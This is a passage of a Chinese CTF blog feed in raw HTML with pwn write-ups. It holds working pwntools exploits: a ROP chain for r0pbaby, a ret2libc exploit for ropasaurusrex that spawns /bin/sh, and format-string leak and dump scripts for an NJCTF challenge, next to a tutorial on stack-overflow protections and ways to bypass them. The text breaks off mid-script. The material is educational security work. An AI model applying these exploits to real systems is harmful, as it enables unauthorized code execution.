class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug =<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug ==<span class="number">1</span>:</span><br><span class="line">  io = process(<span class="string">&quot;./r0pbaby&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">  <span class="comment">#db.attach(io)</span></span><br><span class="line"></span><br><span class="line">system = <span class="number">0x00007FFFF784F390</span><span class="comment">#get_libc_base()</span></span><br><span class="line">rdi_gadget_offset = <span class="number">0x21102</span></span><br><span class="line">bin_sh_offset = <span class="number">0x18c177</span></span><br><span class="line">system_offset = <span class="number">0x45390</span></span><br><span class="line">libc_base = system - system_offset <span class="comment"># system addr - system_offset = libc_base</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] libc base: [%x]&quot;</span> % libc_base</span><br><span class="line">rdi_gadget_addr = libc_base + rdi_gadget_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] RDI gadget addr: [%x]&quot;</span> % rdi_gadget_addr</span><br><span class="line">bin_sh_addr = libc_base + bin_sh_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] \&quot;/bin/sh\&quot; addr: [%x]&quot;</span> % bin_sh_addr</span><br><span class="line">system_addr = <span class="number">0x00007FFFF784F390</span><span class="comment">#get_libc_func_addr(h, &quot;system&quot;)</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] system addr: [%x]&quot;</span> % system_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(rdi_gadget_addr)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.send(<span class="string">&quot;%d\n&quot;</span>%(len(payload)+<span class="number">1</span>))</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-05.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-05.png"></a></p><p>至此 一个简单的64位程序 ROP Pwn题完成！！撒花　撒花～</p><h5 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF 2013: ropasaurusrex"></a>PlaidCTF 2013: ropasaurusrex</h5><p>上一个程序简单的调用 system + “bin/sh” 通过寄存器 gadget  “pop rdi;ret “传参起shell，接着我们来完成第二个pwn，第二个pwn的特点是，我们需要去info leak 得到信息，然后计算system 的地址。</p><p>依旧是老三套，我们先分析一下程序开启的保护。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br></pre></td></tr></table></figure><p>只开了NX 其他的都没开，我们可以应用ret2libc 的攻击方式来获取shell，所以我们得通过比如像write、puts、printf类似的函数做info leak用来计算system在内存中的地址。我们用IDA开，一边分析题目流程，一边找题目漏洞。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_80483F4();</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;WIN\n&quot;</span>, <span class="number">4u</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sub_80483F4</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_80483F4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+10h] [bp-88h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很清晰，我们可以看到题目流程非常简单，就读取一定字节，然后直接打印<code>WIN\n</code>。紧接着，我们可以看到<code>read</code>函数被错误使用，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:080483F2 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:080483F3                 align 4</span><br><span class="line">.text:080483F4</span><br><span class="line">.text:080483F4 ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; S U B R O U T I N E &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">.text:080483F4</span><br><span class="line">.text:080483F4 ; Attributes: bp-based frame</span><br><span class="line">.text:080483F4</span><br><span class="line">.text:080483F4 sub_80483F4     proc near               ; CODE XREF: main+9p</span><br><span class="line">.text:080483F4</span><br><span class="line">.text:080483F4 buf             &#x3D; byte ptr -88h</span><br><span class="line">.text:080483F4</span><br><span class="line">.text:080483F4                 push    ebp</span><br><span class="line">.text:080483F5                 mov     ebp, esp</span><br><span class="line">.text:080483F7                 sub     esp, 98h</span><br><span class="line">.text:080483FD                 mov     dword ptr [esp+8], 100h ; nbytes</span><br><span class="line">.text:08048405                 lea     eax, [ebp+buf]</span><br><span class="line">.text:0804840B                 mov     [esp+4], eax    ; buf</span><br><span class="line">.text:0804840F                 mov     dword ptr [esp], 0 ; fd</span><br><span class="line">.text:08048416                 call    _read</span><br><span class="line">.text:0804841B                 leave</span><br><span class="line">.text:0804841C                 retn</span><br><span class="line">.text:0804841C sub_80483F4     endp</span><br><span class="line">.text:0804841C</span><br><span class="line">.text:0804841</span><br></pre></td></tr></table></figure><p>buf大小只有0x88,但是却允许被读入0x100的字节大小，这明显可以造成缓冲区溢出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wings@sw:~/桌面/Rop$ file ./ropasaurusrex</span><br><span class="line">./ropasaurusrex: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.18, BuildID[sha1]=96997aacd6ee7889b99dc156d83c9d205eb58092, stripped</span><br></pre></td></tr></table></figure><p>我们还知道的一点是，程序是32位，所以我们不需要像第一个题那样去找寄存器 gadget。<br>在main函数中有一个<code>write</code>函数，我们可以通过rop，来进行信息泄漏。所以攻击思大概是：</p><ol><li>构造payload leak 内存中的一个函数地址，比如 read()</li><li>计算libc base</li><li>构造payload get shell</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ropasaurusrex&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bof = <span class="number">0x80483f4</span> <span class="comment"># the vulnerable function</span></span><br><span class="line">buffer_len = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(args.host, args.port)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./ropasaurusrex&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10002</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * buffer_len</span><br><span class="line">payload += <span class="string">&#x27;AAAA&#x27;</span> <span class="comment"># saved ebp</span></span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(bof)</span><br><span class="line">payload += p32(<span class="number">1</span>) <span class="comment"># stdout</span></span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>) <span class="comment"># len</span></span><br><span class="line">p.send(payload)</span><br><span class="line">resp = p.recvn(<span class="number">4</span>)</span><br><span class="line">read = u32(resp)</span><br><span class="line">libc_base = read - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * buffer_len</span><br><span class="line">payload += <span class="string">&#x27;AAAA&#x27;</span> <span class="comment"># saved ebp</span></span><br><span class="line">payload += p32(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload += <span class="string">&#x27;AAAA&#x27;</span> <span class="comment"># cont</span></span><br><span class="line">payload += p32(libc_base + next(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>小结一下：<br>read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）</p><h2 id="上面的内容来自蒸米-一步一步-rop"><a href="#上面的内容来自蒸米-一步一步-rop" class="headerlink" title="上面的内容来自蒸米 -一步一步 rop"></a>上面的内容来自蒸米 -一步一步 rop</h2><p>做了两个简单的rop 第一个的64位，第二个是32位，基本上 也能体会到两者的区别了，一者是寄存器传参，一者是栈传参。至于AliCTF的vsvs ，我没找到Bin程序，所以这里就不单独分析了。我们看看别人的wp，例如链接<a href="https://segmentfault.com/a/1190000005718685">https://segmentfault.com/a/1190000005718685</a></p><p>下一个内容准备学习 VROP，一种利用signal机制的ROP技术。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础栈溢出复习 之基础</title>
      <link href="stack-overflow-one.html"/>
      <url>stack-overflow-one.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="栈与系统栈"><a href="#栈与系统栈" class="headerlink" title="栈与系统栈"></a>栈与系统栈</h4><p>栈:一种先进先出的数据结构。常见操作有两种，进栈(PUSH) 和弹栈(POP),用于标识栈的属性有两个，一个是栈顶(TOP)，一个是栈底(BASE<br>程序中的栈:</p><ul><li>内存中的一块区域，用栈的结构来管理，从高地址向低地址增长</li><li>寄存器esp代表栈顶（即最低栈地址）</li><li>栈操作<ul><li>压栈（入栈）push sth-&gt; [esp]=sth,esp=esp-4</li><li>弹栈（出栈）pop sth-&gt; sth=[esp],esp=esp+4</li></ul></li><li>栈用于保存函数调用信息和局部变量<h5 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h5>如何通过系统栈进行函数的调用和递归<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_b</span><span class="params">(x,y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var_b1,var_b2;</span><br><span class="line"></span><br><span class="line">    rutrun var_b1 * var_b2 ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_a</span><span class="params">(a,b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var_a;</span><br><span class="line">    var_a = fun_b(a*b)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc,chr **argv,chr **envp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> var_main;</span><br><span class="line">    var_main = func_a&#123;<span class="number">5</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    rutrun var_main;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>函数的分布应当是:<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-01-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-01-01.png"></a><br>当CPU调用func_A函数，会从main函数对应的机器指令跳转到func_A，取值在执行，执行结束后，需要返回又会进行跳转…….以此类似的跳转过程。</li></ul><h5 id="函数调用指令-call-ret"><a href="#函数调用指令-call-ret" class="headerlink" title="函数调用指令: call ret"></a>函数调用指令: call ret</h5><p>大致过程:</p><ul><li>参数入栈</li><li>返回地址入栈</li><li>代码区块跳转</li><li>栈帧调整:<br>  保存当前栈帧的状态值，为了后面恢复本栈帧时使用(EBP入栈)；<br>将当前的栈帧切换到新栈帧(ESP值装入EBP，更新栈帧底部)<br>给新栈帧分配空间(ESP减去所需要空间的大小，抬高栈顶)<br>相关指令:</li><li>Call func -&gt; push pc, jmp func</li><li>Leave -&gt;mov esp,ebp, pop ebp </li><li>Ret -&gt; pop pc</li></ul><h5 id="函数约定"><a href="#函数约定" class="headerlink" title="函数约定:"></a>函数约定:</h5><ul><li>__stdcall，__cdecl，__fastcall，__thiscall，__nakedcall，__pascal<br>以 __fastcall为例子:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push  参数 3               #参数由右向左入栈</span><br><span class="line">push 参数 2</span><br><span class="line">push 参数 1</span><br><span class="line">call 函数地址    #push当前指令位置，跳转到所调用函数的入口地址</span><br><span class="line"></span><br><span class="line">push ebp         #保存旧栈帧的底部</span><br><span class="line">mov ebp,esp    #设置新栈帧底部</span><br><span class="line">sub esp ,xxx      #设置新栈帧顶部</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="参数传参-取决于调用约定，一般情况下"><a href="#参数传参-取决于调用约定，一般情况下" class="headerlink" title="参数传参:取决于调用约定，一般情况下:"></a>参数传参:取决于调用约定，一般情况下:</h5></li><li>X86 从右向左入栈，X64 优先寄存器，参数过多时才入栈</li></ul><p>#####　寄存器<br>重要的寄存器：rsp/esp, pc, rbp/ebp, rax/eax, rdi, rsi, rdx, rcx<br>ESP: 栈指针寄存器，内存存放着一个指针，指针指向系统栈最上面一个栈帧的底部<br>EBP:基址指针寄存器，存放着一个指针，指针指向系统栈最上面的一个栈帧底部</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-01-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-01-02.png"></a></p><p>####　堆栈溢出原理<br>通俗的讲，栈溢出的原理就是不顾堆栈中分配的局部数据块大小，向该数据快写入了过多的数据，导致数据越界，结果覆盖来看老的堆栈数据。</p><h4 id="栈溢出的保护机制"><a href="#栈溢出的保护机制" class="headerlink" title="栈溢出的保护机制"></a>栈溢出的保护机制</h4><h5 id="栈上的数据无法被当作指令来执行"><a href="#栈上的数据无法被当作指令来执行" class="headerlink" title="栈上的数据无法被当作指令来执行"></a>栈上的数据无法被当作指令来执行</h5><ul><li>数据执行保护(NX/DEP)</li><li>绕过方法ROP<h5 id="难以找到想要找的地址"><a href="#难以找到想要找的地址" class="headerlink" title="难以找到想要找的地址"></a>难以找到想要找的地址</h5></li><li>地址空间布局随机化(ASLR)</li><li>绕过方法:infoleak 、retdlresolve 、ROP<h5 id="检测栈数据是否被修改"><a href="#检测栈数据是否被修改" class="headerlink" title="检测栈数据是否被修改"></a>检测栈数据是否被修改</h5></li><li>Stack Canary/ Cookie</li><li>绕过方法: infoleak<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-01-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-01-03.png"></a></li><li><strong>如今 计算机保护 基本上都是NX+Stack Canary +ASLR</strong><h6 id="CTF-常用套路-栈溢出的利用方法"><a href="#CTF-常用套路-栈溢出的利用方法" class="headerlink" title="CTF 常用套路: 栈溢出的利用方法"></a>CTF 常用套路: 栈溢出的利用方法</h6></li><li>现代栈溢出利用技术基础：ROP </li><li>利用signal机制的ROP技术：SROP </li><li>没有binary怎么办：BROP 、dump bin</li><li>劫持栈指针：stack pivot </li><li>利用动态链接绕过ASLR：ret2dl resolve、fake linkmap </li><li>利用地址低12bit绕过ASLR：Partial Overwrite </li><li>绕过stack canary：改写指针与局部变量、leak canary、overwrite canary </li><li>溢出位数不够怎么办：覆盖ebp，Partial Overwrite <h4 id="现代栈溢出利用技术基础-ROP"><a href="#现代栈溢出利用技术基础-ROP" class="headerlink" title="现代栈溢出利用技术基础:ROP"></a>现代栈溢出利用技术基础:ROP</h4>讲道理学习ROP ，看蒸米的<a href="http://wooyun.bestwing.top:5000/search?keywords=rop&content_search_by=by_drops">文章</a>是最实在的。蒸米的一步一步学ROP简直是经典篇目。</li></ul><p>ROP的基础学习可以看我翻译的一篇<a href="http://m.bobao.360.cn/learning/appdetail/3569.html">文章</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017 XCTF 南京站　线上赛　NJCTF</title>
      <link href="2017-NJCTF-part-writeup.html"/>
      <url>2017-NJCTF-part-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="Pingme"><a href="#Pingme" class="headerlink" title="Pingme"></a>Pingme</h1><h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><p>nc 218.2.197.235 23745</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>题目并没有提供Bin文件，但是我们可以通过leak的方法，把整个Bin文件dump下来。<br>代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">io, addr</span>):</span></span><br><span class="line">    prefix = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> addr&amp;<span class="number">0xff</span> == <span class="number">0x0a</span>:</span><br><span class="line">        prefix = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;-..-%%%d$s.--.\x00&quot;</span>%(<span class="number">7</span>+<span class="number">10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">40</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload += l32(addr)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line">    io.read_until(<span class="string">&quot;-..-&quot;</span>)</span><br><span class="line">    data = io.read_until(<span class="string">&quot;.--.&quot;</span>)[:<span class="number">-4</span>] + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> prefix + data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_buff</span>(<span class="params">io, addr, size</span>):</span></span><br><span class="line"></span><br><span class="line">    buff = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> len(buff) &lt; size:</span><br><span class="line">        buff += get_data(io, addr + len(buff))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> buff</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_file</span>(<span class="params">io</span>):</span></span><br><span class="line"></span><br><span class="line">    io.read_until(<span class="string">&quot;Ping me\n&quot;</span>)</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    payload = &quot;&quot;</span></span><br><span class="line"><span class="string">    payload += &quot;%%%d$s.&quot;%(7+10)</span></span><br><span class="line"><span class="string">    payload = payload.ljust(40, &#x27;a&#x27;)</span></span><br><span class="line"><span class="string">    payload += l32(0x80484F0)</span></span><br><span class="line"><span class="string">    io.writeline(payload)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#data = get_data(io, 0x8048000)</span></span><br><span class="line">    <span class="comment">#print &quot;data:&quot;, repr(data)</span></span><br><span class="line">    buff = get_buff(io, <span class="number">0x8048400</span>, <span class="number">0x700</span>)</span><br><span class="line">    file_w = open(<span class="string">&quot;dump.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    file_w.write(buff)</span><br><span class="line">    file_w.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;ok&quot;</span></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-njctf-fmt.pnt" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-njctf-fmt.pnt"></a></p><p>逻辑清晰　233　格式串漏洞，我们需要获得libc或者使用DynELF获取system地址。</p><p>可以在9k师傅打libc db的库中，找到libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&quot;218.2.197.235&quot;</span>,<span class="number">23745</span>)</span><br><span class="line">    <span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(<span class="string">&quot;./pingme&quot;</span>)</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x08048617</span></span><br><span class="line">printf_got = <span class="number">0x08049974</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&quot;218.2.197.235&quot;, 23745)#pwn</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pingme&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = p32(addr)</span><br><span class="line">    payload += <span class="string">&quot;%7$sDCBA&quot;</span>  <span class="comment"># $rsp address</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    data = r.recv(<span class="number">4</span>)</span><br><span class="line">    f = <span class="number">4</span></span><br><span class="line">    <span class="comment"># l = data.find(&quot;DCBA&quot;)</span></span><br><span class="line">    res = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        log.info(<span 